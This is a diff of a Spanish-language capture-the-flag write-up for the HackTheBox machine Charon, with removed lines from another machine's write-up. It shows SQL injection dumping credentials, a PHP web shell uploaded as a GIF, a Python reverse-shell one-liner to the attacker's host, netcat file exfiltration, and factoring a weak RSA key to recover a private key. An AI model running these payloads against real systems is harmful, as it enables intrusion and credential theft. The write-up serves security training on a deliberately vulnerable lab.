+<p>Vemos que la combinación <code class="language-plaintext highlighter-rouge">@</code> y <code class="language-plaintext highlighter-rouge">.</code> generan una respuesta <strong>Email sent to:</strong>, por lo que podriamos pensar que dichos símbolos son necesarios cuando queramos hacer una inyección. Ahora vamos a tratar de obtener el nombre de la base de datos a través del comando <code class="language-plaintext highlighter-rouge">database()</code> y <code class="language-plaintext highlighter-rouge">concat</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 sqli_charon.py
+Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(database(),"@.")-- -
+[*] Email sent to: supercms@.=
+Email:  
+</span></code></pre></div></div>
+
+<p>Tenemos el nombre de la base de datos <code class="language-plaintext highlighter-rouge">supercms</code>; por lo que ya encontramos una forma de dumpear la base de datos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 sqli_charon.py
+Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(database(),"@.")-- -
+[*] Email sent to: supercms@.=
+Email: test@test.com'</span> UNion <span class="k">select </span>1,2,3,concat<span class="o">(</span>user<span class="o">()</span>,<span class="s2">"@."</span><span class="o">)</span><span class="nt">--</span> -
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Email sent to: supercms@localhost@.<span class="o">=</span>
+Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(table_name,"@.") from information_schema.tables where table_schema="supercms" limit 1,1-- -
+[*] Email sent to: license@.=
+Email: test@test.com'</span> UNion <span class="k">select </span>1,2,3,concat<span class="o">(</span>table_name,<span class="s2">"@."</span><span class="o">)</span> from information_schema.tables where <span class="nv">table_schema</span><span class="o">=</span><span class="s2">"supercms"</span> limit 2,1-- -
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Email sent to: operators@.<span class="o">=</span>
+Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(table_name,"@.") from information_schema.tables where table_schema="supercms" limit 3,1-- -
+[*] User not found with that email!    
+Email: 
+</span></code></pre></div></div>
+
+<p>Ya tenemos las tablas que componen la base de datos <code class="language-plaintext highlighter-rouge">supercms</code> que son <code class="language-plaintext highlighter-rouge">license</code> y <code class="language-plaintext highlighter-rouge">operators</code>. Aqui ya nos llama más la atención la segunda tabla, así que vamos a listar las columnas de dicha tabla:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(column_name,"@.") from information_schema.columns where table_name="operators" limit 1,1-- -
+[*] Email sent to: __username_@.=
+Email: test@test.com'</span> UNion <span class="k">select </span>1,2,3,concat<span class="o">(</span>column_name,<span class="s2">"@."</span><span class="o">)</span> from information_schema.columns where <span class="nv">table_name</span><span class="o">=</span><span class="s2">"operators"</span> limit 2,1-- -
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Email sent to: __password_@.<span class="o">=</span>
+Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(column_name,"@.") from information_schema.columns where table_name="operators" limit 3,1-- -
+[*] Email sent to: email@.=
+Email: test@test.com'</span> UNion <span class="k">select </span>1,2,3,concat<span class="o">(</span>column_name,<span class="s2">"@."</span><span class="o">)</span> from information_schema.columns where <span class="nv">table_name</span><span class="o">=</span><span class="s2">"operators"</span> limit 4,1-- -
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User not found with that email!    
+Email:  
+</code></pre></div></div>
+
+<p>Ya tenemos las columnas de la tabla <code class="language-plaintext highlighter-rouge">operators</code>, las cuales son: <code class="language-plaintext highlighter-rouge">__username_</code>, <code class="language-plaintext highlighter-rouge">__password_</code> y <code class="language-plaintext highlighter-rouge">email</code>. Por lo tanto, lo que nos queda es listar los datos de dichas columnas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Email sent to: test51:5f4dcc3b5aa765d61d8327deb882cf99@.<span class="o">=</span>
+Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(__username_,0x3a,__password_,"@.") from operators limit 100,1-- -
+[*] Email sent to: test101:5f4dcc3b5aa765d61d8327deb882cf99@.=
+Email: test@test.com'</span> UNion <span class="k">select </span>1,2,3,concat<span class="o">(</span>__username_,0x3a,__password_,<span class="s2">"@."</span><span class="o">)</span> from operators limit 200,1-- -
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Email sent to: super_cms_adm:0b0689ba94f94533400f4decd87fa260@.<span class="o">=</span>
+Email:
+</code></pre></div></div>
+
+<p>Vemos varios usuarios, pero ya tenemos uno que nos debe llamar mucho la atención: <code class="language-plaintext highlighter-rouge">super_cms_adm</code> y tenemos su contraseña hasheada; por lo que vamos a crackearla con la herramienta online <a href="https://crackstation.net/">crackstation</a></p>
+
+<p><img src="/assets/images/htb-charon/charon-hash.png" alt="" /></p>
+
+<p>Ya tenemos unas credenciales a probar, así que validaremos en el panel de login (<strong>Nota</strong>: Simpre guardar las credenciales que vayamos encontrando):</p>
+
+<p><img src="/assets/images/htb-charon/charon-web6.png" alt="" /></p>
+
+<p>Aqui algo que ya nos llama la atención es que podemos super archivos y en específico, imágenes.</p>
+
+<p><img src="/assets/images/htb-charon/charon-web7.png" alt="" /></p>
+
+<p>Vamos a tratar de subir un archivo php el cual nos ayude a ejecutar comandos a nivel de sistema.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="o">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-charon/charon-web8.png" alt="" /></p>
+
+<p>Vamos a cambiar la cabezara de nuestro archivo para que sea considerado como un GIF.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GIF8;
+<span class="cp">&lt;?php</span>
+        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="o">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Pero vemos que nos sigue mandanlo lo mismo, por lo que cambiaremos la extensión de nuestro archivo.</p>
+
+<p><img src="/assets/images/htb-charon/charon-web9.png" alt="" /></p>
+
+<p>Vemos que nuestro archivo se sube en la ruta <code class="language-plaintext highlighter-rouge">/images/</code>; sin embargo, no presenta la extensión php que necesitamos para poder ejecutar comandos. Si le echamos un ojo al código fuente del sitio, vemos un campo que se encuentra comentado.</p>
+
+<p><img src="/assets/images/htb-charon/charon-web10.png" alt="" /></p>
+
+<p>Vamos a descomentar el campo y modificar el tipo. Además, podemos ver que el nombre está medio raro, como que está en base64, por lo que vamos a descifrarlo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"dGVzdGZpbGUx"</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
+</span>testfile1
+</code></pre></div></div>
+
+<p>Vemos que el nombre es <code class="language-plaintext highlighter-rouge">testfile1</code>, por lo que vamos a cambiar lo que está en base64 por <code class="language-plaintext highlighter-rouge">testfile1</code>, quedando de la siguiente forma:</p>
+
+<p><img src="/assets/images/htb-charon/charon-web11.png" alt="" /></p>
+
+<p>Ahora vamos a tratar de subir un archivo nuevamente <code class="language-plaintext highlighter-rouge">shell.gif</code> y vamos a agregar algo en el nuevo campo que tenemos, por ejemplo <code class="language-plaintext highlighter-rouge">test</code>.</p>
+
+<p><img src="/assets/images/htb-charon/charon-web12.png" alt="" /></p>
+
+<p>Y vemos que con dicho campo podemos modificar el nombre del archivo, por lo tanto podríamos subir nuevamente nuestra shell <code class="language-plaintext highlighter-rouge">shell.gif</code> y aprovechando el campo para cambiar la extensión.</p>
+
+<p><img src="/assets/images/htb-charon/charon-web13.png" alt="" /></p>
+
+<p>Ahora vamos a validar en la ruta que se nos indica <code class="language-plaintext highlighter-rouge">/images/shell.php</code>:</p>
+
+<p><img src="/assets/images/htb-charon/charon-web14.png" alt="" /></p>
+
+<p>Ya logramos ejecución de comandos a nivel de sistema, así que ahora nos queda es entablarnos una reverse shell, por lo que nos ponemos en escucha a través del puerto 443.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.31/images/shell.php?cmd<span class="o">=</span>python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
 </code></pre></div></div>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
 listening on <span class="o">[</span>any] 443 ...
-connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.168] 35894
-<span class="nv">$ </span><span class="nb">whoami
-</span>www-data
-<span class="nv">$ </span>
-</code></pre></div></div>
-
-<p>Como siempre, vamos a hacer un <a href="/tratamiento-tty">Tratamiento de la tty</a> para poder trabajar más cómodos. Ahora, vemos que no podemos visualizar la flag, por lo tanto vamos a enumerar un poco el sistema para ver la forma de escalar privilegios. Si entramos al recurso <code class="language-plaintext highlighter-rouge">/home/robert</code>, vemos algunos archivos en los cuales tenemos permisos de lectura y ejecución.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@obscure:/home/robert<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
-total 24
-drwxr-xr-x 2 root   root   4096 Dec  2  2019 BetterSSH
-<span class="nt">-rw-rw-r--</span> 1 robert robert   94 Sep 26  2019 check.txt
-<span class="nt">-rw-rw-r--</span> 1 robert robert  185 Oct  4  2019 out.txt
-<span class="nt">-rw-rw-r--</span> 1 robert robert   27 Oct  4  2019 passwordreminder.txt
-<span class="nt">-rwxrwxr-x</span> 1 robert robert 2514 Oct  4  2019 SuperSecureCrypt.py
-<span class="nt">-rwx------</span> 1 robert robert   33 Sep 25  2019 user.txt
-www-data@obscure:/home/robert<span class="err">$</span>
-</code></pre></div></div>
-
-<p>Vemos un programa en python <code class="language-plaintext highlighter-rouge">SuperSecureCrypt.py</code>, así que antes de ver si código, vamos a ejecutarlo a ver que nos hace.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@obscure:/home/robert<span class="nv">$ </span>python3 SuperSecureCrypt.py 
-<span class="c">################################</span>
-<span class="c">#           BEGINNING          #</span>
-<span class="c">#    SUPER SECURE ENCRYPTOR    #</span>
-<span class="c">################################</span>
-  <span class="c">############################</span>
-  <span class="c">#        FILE MODE         #</span>
-  <span class="c">############################</span>
-Missing args
-www-data@obscure:/home/robert<span class="nv">$ </span>python3 SuperSecureCrypt.py <span class="nt">-h</span>
-usage: SuperSecureCrypt.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-i</span> InFile] <span class="o">[</span><span class="nt">-o</span> OutFile] <span class="o">[</span><span class="nt">-k</span> Key] <span class="o">[</span><span class="nt">-d</span><span class="o">]</span>
-
-Encrypt with 0bscura<span class="s1">'s encryption algorithm
-
-optional arguments:
-  -h, --help  show this help message and exit
-  -i InFile   The file to read
-  -o OutFile  Where to output the encrypted/decrypted file
-  -k Key      Key to use
-  -d          Decrypt mode
-www-data@obscure:/home/robert$
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.31] 56646
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami
+www-data
+$ 
 </span></code></pre></div></div>
 
-<p>Debido a los argmentos, así como al nombre del script, podemos intuir que nos ayuda a cifrar archivos a partir de una llave. Vamos a ver ahora el archivo <code class="language-plaintext highlighter-rouge">check.txt</code>.</p>
+<p>Ya estamos dentro de la máquina, así que primero vamos a realizar un <a href="/tratamiento-tty">Tratamiento de la tty</a> para trabajar más cómodos. Vemos que no podemos visualizar la primera flag, así que vamos a enumerar un poco para ver la forma de migrar a otro usuario o escalar privilegios.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@obscure:/home/robert<span class="nv">$ </span><span class="nb">cat </span>check.txt 
-Encrypting this file with your key should result <span class="k">in </span>out.txt, make sure your key is correct! 
-www-data@obscure:/home/robert<span class="nv">$ </span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@charon:/home/decoder<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 12
+<span class="nt">-rw-r--r--</span> 1 decoder freeeze 138 Jun 23  2017 decoder.pub
+<span class="nt">-rw-r--r--</span> 1 decoder freeeze  32 Jun 23  2017 pass.crypt
+<span class="nt">-r--------</span> 1 decoder freeeze  33 Jun 23  2017 user.txt
+www-data@charon:/home/decoder<span class="err">$</span>
 </code></pre></div></div>
 
-<p>Aqui nos dice que el archivo <code class="language-plaintext highlighter-rouge">out.txt</code> resulta en la salida de ejecutar el script <code class="language-plaintext highlighter-rouge">SuperSecureCrypt.py</code> y de acuerdo con la sintaxis de ejecución, vemos que tenemos la posiblidad de descifrar el contenido del archivo, pero no tenemos una llave. Pensando un poco, vemos que el archivo <code class="language-plaintext highlighter-rouge">check.txt</code> podría ser una pista o una llave, así que vamos a tratar de descrifar el archivo <code class="language-plaintext highlighter-rouge">out.txt</code> utilizando como llave todo el contenido del archivo <code class="language-plaintext highlighter-rouge">check.txt</code> (<strong>Nota</strong>: Debido a que no tenemos permisos dentro del directorio actual, vamos a mandar la salida hacia <code class="language-plaintext highlighter-rouge">/dev/shm</code>).</p>
+<p>Dentro del directorio del usuario <code class="language-plaintext highlighter-rouge">decoder</code>, vemos algunos archivos los cuales podemos ver el contenido que son <code class="language-plaintext highlighter-rouge">decoder.pub</code> y <code class="language-plaintext highlighter-rouge">pass.crypt</code>:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@obscure:/home/robert<span class="nv">$ </span>python3 SuperSecureCrypt.py <span class="nt">-i</span> out.txt <span class="nt">-o</span> /dev/shm/out.decrypted <span class="nt">-k</span> <span class="s2">"Encrypting this file with your key should result in out.txt, make sure your key is correct!"</span> <span class="nt">-d</span>
-<span class="c">################################</span>
-<span class="c">#           BEGINNING          #</span>
-<span class="c">#    SUPER SECURE ENCRYPTOR    #</span>
-<span class="c">################################</span>
-  <span class="c">############################</span>
-  <span class="c">#        FILE MODE         #</span>
-  <span class="c">############################</span>
-Opening file out.txt...
-Decrypting...
-Writing to /dev/shm/out.decrypted...
-www-data@obscure:/home/robert<span class="nv">$ </span><span class="nb">cat</span> /dev/shm/out.decrypted 
-alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichwww-data@obscure:/home/robert<span class="nv">$ </span><span class="nb">cat</span> /dev/shm/out.decrypted <span class="p">;</span> <span class="nb">echo
-</span>alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich&lt;
-www-data@obscure:/home/robert<span class="err">$</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@charon:/home/decoder<span class="nv">$ </span><span class="nb">cat </span>decoder.pub 
+<span class="nt">-----BEGIN</span> PUBLIC KEY-----
+MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhALxHhYGPVMYmx3vzJbPPAEa10NETXrV3
+<span class="nv">mI9wJizmFJhrAgMBAAE</span><span class="o">=</span>
+<span class="nt">-----END</span> PUBLIC KEY-----
+www-data@charon:/home/decoder<span class="nv">$ </span><span class="nb">cat </span>pass.crypt <span class="p">;</span> <span class="nb">echo
+</span>2OSb<span class="s2">"eWgTo7I
+www-data@charon:/home/decoder</span><span class="err">$</span><span class="s2">
+</span></code></pre></div></div>
+
+<p>Lo que haremos primero será transferirnos los archivos a nuestra máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@charon:/home/decoder<span class="nv">$ </span>nc 10.10.14.27 443 &lt; decoder.pub 
+www-data@charon:/home/decoder<span class="nv">$ </span>nc 10.10.14.27 443 &lt; pass.crypt  
+www-data@charon:/home/decoder<span class="nv">$ </span><span class="nb">md5sum </span>decoder.pub 
+afcb9745eb5e553d7b15077363878c1b  decoder.pub
+www-data@charon:/home/decoder<span class="nv">$ </span><span class="nb">md5sum </span>pass.crypt 
+ade0dc6187e2fa671c1d7a02d3c9f737  pass.crypt
+www-data@charon:/home/decoder<span class="nv">$ </span>
 </code></pre></div></div>
 
-<p>Tenemos una cadena de texto que se repite: <code class="language-plaintext highlighter-rouge">alexandrovich</code>; por lo que podríamos pensar que podría ser un usuario de sistema; sin embargo, no existe. Si nos damos cuenta, existe otro archivo que no hemos revisado, <code class="language-plaintext highlighter-rouge">passwordreminder.txt</code>, el cual si tratamos de leerlo tiene una apariencia similar a <code class="language-plaintext highlighter-rouge">out.txt</code>; por lo que podría ser un archivo cifrado.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@obscure:/home/robert<span class="nv">$ </span><span class="nb">cat </span>out.txt <span class="p">;</span> <span class="nb">echo</span>
-¦ÚÈêÚÞØÛÝÝ	×ÐÊß
-ÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐ
-êÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäè	ÎÍÚÎëÑÓäáÛÌ×	v
-www-data@obscure:/home/robert<span class="nv">$ </span><span class="nb">cat </span>passwordreminder.txt <span class="p">;</span> <span class="nb">echo</span>
-´ÑÈÌÉàÙÁÑé¯·¿k
-www-data@obscure:/home/robert<span class="nv">$ </span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> decoder.pub
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.31] 56648
+❯ nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> pass.crypt
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.31] 56650
+❯ <span class="nb">md5sum </span>decoder.pub
+afcb9745eb5e553d7b15077363878c1b  decoder.pub
+❯ <span class="nb">md5sum </span>pass.crypt
+ade0dc6187e2fa671c1d7a02d3c9f737  pass.crypt
 </code></pre></div></div>
 
-<p>Lo que podríamos hacer a este punto, sería tratar de descifrar dicho archivo y utilizamos como llave <code class="language-plaintext highlighter-rouge">alexandrovich</code>.</p>
+<p>Ahora, de acuerdo con las extensiones, <code class="language-plaintext highlighter-rouge">decoder.pub</code> podría ser una llave pública y <code class="language-plaintext highlighter-rouge">pass.crypt</code> es un archivo que ha sido cifrado utilizando la llave privada, pero no contamos con dicha llave; por lo tanto podríamos tratar de obtener la llave privada a partir de la llave pública y para lograrlo, primeramente debemos de encontrar algunas variables que necesitamos (<strong>Nota</strong>: Se comparte un recurso para saber un poco más de este tema <a href="https://pycryptodome.readthedocs.io/en/latest/src/public_key/rsa.html">readthedocs</a>):</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@obscure:/home/robert<span class="nv">$ </span>python3 SuperSecureCrypt.py <span class="nt">-i</span> passwordreminder.txt <span class="nt">-o</span> /dev/shm/passwordreminder.decrypted <span class="nt">-k</span> <span class="s2">"alexandrovich"</span> <span class="nt">-d</span>
-<span class="c">################################</span>
-<span class="c">#           BEGINNING          #</span>
-<span class="c">#    SUPER SECURE ENCRYPTOR    #</span>
-<span class="c">################################</span>
-  <span class="c">############################</span>
-  <span class="c">#        FILE MODE         #</span>
-  <span class="c">############################</span>
-Opening file passwordreminder.txt...
-Decrypting...
-Writing to /dev/shm/passwordreminder.decrypted...
-www-data@obscure:/home/robert<span class="nv">$ </span><span class="nb">cat</span> /dev/shm/passwordreminder.decrypted 
-SecThruObsFTW
-www-data@obscure:/home/robert<span class="err">$</span>
+<ul>
+  <li><strong><em>n</em></strong> - RSA modulus</li>
+  <li><strong><em>e</em></strong> - RSA public exponent</li>
+  <li><strong><em>p</em></strong> - First factor of the RSA modulus</li>
+  <li><strong><em>q</em></strong> - Second factor of the RSA modulus</li>
+  <li><strong><em>d</em></strong> - RSA private exponent</li>
+  <li><strong><em>m</em></strong> - Remainder component</li>
+</ul>
+
+<p>El valor de <strong><em>n</em></strong> es público y se obtiene de la llave pública y de igual forma el valor de <strong><em>e</em></strong>. Ahora, si el valor de <strong><em>n</em></strong> es relativamente pequeño, se puede computar <strong><em>p</em></strong> y <strong><em>q</em></strong> ya que <strong><em>n = p q</em></strong> en donde <strong><em>p</em></strong> y <strong><em>q</em></strong> son números primos. Asi que vamos a generar un programa en python que nos ayude a generar dichos valores.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+#coding:utf-8
+</span>  
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+  
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="s">"decoder.pub"</span><span class="p">,</span><span class="s">"r"</span><span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">e</span>
+<span class="n">n</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">n</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de e = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">key</span><span class="o">.</span><span class="n">e</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de n = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">key</span><span class="o">.</span><span class="n">n</span><span class="p">)</span>
 </code></pre></div></div>
 
-<p>Tenemos otra contraseña, la cual podría ser la del usuario <code class="language-plaintext highlighter-rouge">robert</code>; así que vamos a tratar de migrar a dicho usuario:</p>
+<p>Al imprimir las variables, tenemos que:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@obscure:/home/robert<span class="nv">$ </span>su robert
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 decrypter.py
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> El valor de e <span class="o">=</span> 65537 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> El valor de n <span class="o">=</span> 85161183100445121230463008656121855194098040675901982832345153586114585729131
+</code></pre></div></div>
+
+<p>Ahora para encontrar <strong><em>p</em></strong> y <strong><em>q</em></strong> vamos a hacer uso de <a href="http://factordb.com/">factordb</a></p>
+
+<p><img src="/assets/images/htb-charon/charon-pq.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> El valor de p <span class="o">=</span> 280651103481631199181053614640888768819 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> El valor de q <span class="o">=</span> 303441468941236417171803802700358403049
+</code></pre></div></div>
+
+<p>Ahora, el valor de <strong><em>m</em></strong> lo obtenemos de la siguiente expresión: <strong><em>m = n - (p + q - 1)</em></strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> El valor de m <span class="o">=</span> 85161183100445121230463008656121855193513948103479115215992296168773338557264
+</code></pre></div></div>
+
+<p>Para encontrar <strong><em>d</em></strong> vamos a hacer uso de la <strong>Función inversa multiplicativa modular</strong> y de los valores que encontramos anteriormente que son <strong><em>e</em></strong> y <strong><em>m</em></strong>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Modular multiplicative inverse function in Python
+</span>  <span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+      <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+          <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+      <span class="k">else</span><span class="p">:</span>
+          <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
+          <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+  
+  <span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
+      <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
+      <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+          <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">'modular inverse does not exist'</span><span class="p">)</span>
+      <span class="k">else</span><span class="p">:</span>
+          <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
+  
+  <span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">m</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> El valor de d <span class="o">=</span> 21250987814893564133283367312544315727523797355452606165102736035279600512161
+</code></pre></div></div>
+
+<p>Ya con todos los valores obtenidos, podemos generar una llave privada:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">priv_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">construct</span><span class="p">((</span><span class="n">n</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">))</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> La clave privada es:
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+MIGsAgEAAiEAvEeFgY9UxibHe/Mls88ARrXQ0RNetXeYj3AmLOYUmGsCAwEAAQIg
+LvuiAxyjSPcwXGvmgqIrLQxWT1SAKVZwewy/gpO2bKECEQDTI2+4s2LacjlWAWZA
+A2kzAhEA5Eizfe3idizLLBr0vsjD6QIRALlM92clYJOQ/csCjWeO1ssCEQDHxRNG
+<span class="nv">BVGjRsm5XBGHj1tZAhEAkJAmnUZ7ivTvKY17SIkqPQ</span><span class="o">==</span>
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+</code></pre></div></div>
+
+<p>Una vez que tenemos la llave privada, vamos a descifrar el archivo <code class="language-plaintext highlighter-rouge">pass.crypt</code> mediante la herramienta <code class="language-plaintext highlighter-rouge">openssl</code> en donde <code class="language-plaintext highlighter-rouge">private.key</code> es un archivo que contiene nuestra llave privada que generamos y <code class="language-plaintext highlighter-rouge">pass.decrypted</code> es el archivo <code class="language-plaintext highlighter-rouge">pass.crypt</code> ya descifrado:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl rsautl <span class="nt">-decrypt</span> <span class="nt">-inkey</span> private.key <span class="nt">-in</span> pass.crypt <span class="nt">-out</span> pass.decrypted
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>pass.decrypted
+───────┬─────────────────────────────────────
+       │ File: pass.decrypted
+───────┼─────────────────────────────────────
+   1   │ nevermindthebollocks
